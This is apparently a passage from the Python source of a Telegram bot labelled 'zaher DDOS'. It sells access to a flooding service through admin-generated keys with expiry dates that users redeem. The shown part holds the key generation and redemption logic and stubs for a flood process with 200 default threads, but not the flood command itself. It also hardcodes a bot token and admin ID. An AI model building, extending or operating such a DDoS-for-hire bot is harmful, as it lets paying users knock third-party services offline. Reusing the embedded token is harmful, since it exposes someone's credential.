#zaher DDOS 
 
import subprocess 
import json 
import os 
import random 
import string 
import datetime 
from telegram import Update 
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes 
 
#insert your telegram username here 
OWNER_USERNAME = "@venomXcrazy" 
# Insert your Telegram bot token here 
BOT_TOKEN = '6640045434:AAHGd30oEOSzqt195bekNSALLtKo8L_Wf3M' 
  
# Admin user IDs 
ADMIN_IDS = {"5040879674"} 
 
 
USER_FILE = "users.json" 
KEY_FILE = "keys.json" 
 
flooding_process = None 
flooding_command = None 
 
 
DEFAULT_THREADS = 200 
 
 
users = {} 
keys = {} 
 
 
def load_data(): 
    global users, keys 
    users = load_users() 
    keys = load_keys() 
 
def load_users(): 
    try: 
        with open(USER_FILE, "r") as file: 
            return json.load(file) 
    except FileNotFoundError: 
        return {} 
    except Exception as e: 
        print(f"Error loading users: {e}") 
        return {} 
 
def save_users(): 
    with open(USER_FILE, "w") as file: 
        json.dump(users, file) 
 
def load_keys(): 
    try: 
        with open(KEY_FILE, "r") as file: 
            return json.load(file) 
    except FileNotFoundError: 
        return {} 
    except Exception as e: 
        print(f"Error loading keys: {e}") 
        return {} 
 
def save_keys(): 
    with open(KEY_FILE, "w") as file: 
        json.dump(keys, file) 
 
def generate_key(length=6): 
    characters = string.ascii_letters + string.digits 
    return ''.join(random.choice(characters) for _ in range(length)) 
 
def add_time_to_current_date(hours=0, days=0): 
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S') 
 
# Command to generate keys 
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None: 
    user_id = str(update.message.from_user.id) 
    if user_id in ADMIN_IDS: 
        command = context.args 
        if len(command) == 2: 
            try: 
                time_amount = int(command[0]) 
                time_unit = command[1].lower() 
                if time_unit == 'hours': 
                    expiration_date = add_time_to_current_date(hours=time_amount) 
                elif time_unit == 'days': 
                    expiration_date = add_time_to_current_date(days=time_amount) 
                else: 
                    raise ValueError("Invalid time unit") 
                key = generate_key() 
                keys[key] = expiration_date 
                save_keys() 
                response = f"Key generated: {key}\nExpires on: {expiration_date}" 
            except ValueError: 
                response = "Please specify a valid number and unit of time (hours/days) script by @venomXcrazy." 
        else: 
            response = "Usage: /genkey <amount> <hours/days>" 
    else: 
        response = "ONLY OWNER CAN USE💀OWNER {OWNER_USERNAME}" 
 
    await update.message.reply_text(response) 
 
 
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None: 
    user_id = str(update.message.from_user.id) 
    command = context.args 
    if len(command) == 1: 
        key = command[0] 
        if key in keys: 
            expiration_date = keys[key] 
            if user_id in users: 
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S') 
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1) 
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S') 
            else: 
                users[user_id] = expiration_date 
            save_users() 
            del keys[key] 
            save_keys() 
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]}" 
        else: 
            response = "Invalid or expired key."
